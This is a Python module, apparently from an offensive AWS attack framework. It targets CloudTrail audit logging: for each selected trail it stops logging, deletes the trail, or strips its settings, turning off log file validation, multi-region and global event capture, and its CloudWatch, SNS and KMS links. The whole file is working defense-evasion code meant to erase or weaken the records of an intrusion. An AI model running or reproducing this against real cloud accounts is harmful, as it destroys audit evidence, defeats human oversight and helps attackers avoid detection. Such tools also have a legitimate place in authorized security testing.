#!/usr/bin/env python3
import datetime

import argparse
from copy import deepcopy

def main(args, awsattack_main, data=None):
    technique_info = data
    session = awsattack_main.get_active_session()
    
    print = awsattack_main.print
    fetch_data = awsattack_main.fetch_data
    get_regions = awsattack_main.get_regions

    ct_regions = get_regions('cloudtrail')

    trails = []

    summary_data = {}

    if args.trails is not None:
        ct_regions = set()
        for trail in args.trails.split(','):
            name, region = trail.split('@')
            trails.append({
                'Name': name,
                'Region': region
            })
            ct_regions.add(region)

    else:
        arguments = []
        cloudtrail_data = deepcopy(session.CloudTrail)

        if 'Trails' not in cloudtrail_data:
            if fetch_data(['Logging/Monitoring Data'], technique_info['prerequisite_modules'][0], None) is False:
                print('Pre-req module not run successfully. Only targeting services that currently have valid data...\n')
            else:
                trails = deepcopy(session.CloudTrail['Trails'])
            
        else:
            trails = cloudtrail_data['Trails']

    if len(trails) > 0:
        print('Starting CloudTrail...\n')
        summary_data['cloudtrail'] = {
            'disabled': 0,
            'deleted': 0,
            'minimized': 0,
        }
        for region in ct_regions:
            print('  Starting region {}...\n'.format(region))

            client = awsattack_main.get_boto3_client('cloudtrail', region)

            for trail in trails:
                if trail['Region'] == region:
                    action = args.action

                    if action == 'dis':
                        try:
                            client.stop_logging(
                                Name=trail['Name']
                            )
                            print('        Successfully disabled trail {}!\n'.format(trail['Name']))
                            summary_data['cloudtrail']['disabled'] += 1
                        except Exception as error:
                            print('        Could not disable trail {}:\n      {}\n'.format(trail['Name'], error))

                    elif action == 'del':
                        try:
                            client.delete_trail(
                                Name=trail['Name']
                            )
                            print('        Successfully deleted trail {}!\n'.format(trail['Name']))
                            summary_data['cloudtrail']['deleted'] += 1
                        except Exception as error:
                            print('        Could not delete trail {}:\n      {}\n'.format(trail['Name'], error))

                    elif action == 'm':
                        try:
                            client.update_trail(
                                Name=trail['Name'],
                                SnsTopicName='',
                                IncludeGlobalServiceEvents=False,
                                IsMultiRegionTrail=False,
                                EnableLogFileValidation=False,
                                CloudWatchLogsLogGroupArn='',
                                CloudWatchLogsRoleArn='',
                                KmsKeyId=''
                            )
                            print('        Successfully minimized trail {}!\n'.format(trail['Name']))
                            summary_data['cloudtrail']['minimized'] += 1
                        except Exception as error:
                            print('        Could not minimize trail {}:\n      {}\n'.format(trail['Name'], error))

                    else:
                        print('        Skipping trail {}...\n'.format(trail['Name']))

        print('CloudTrail finished.\n')
    else:
        print('No trails found. Skipping CloudTrail...\n')

    return summary_data
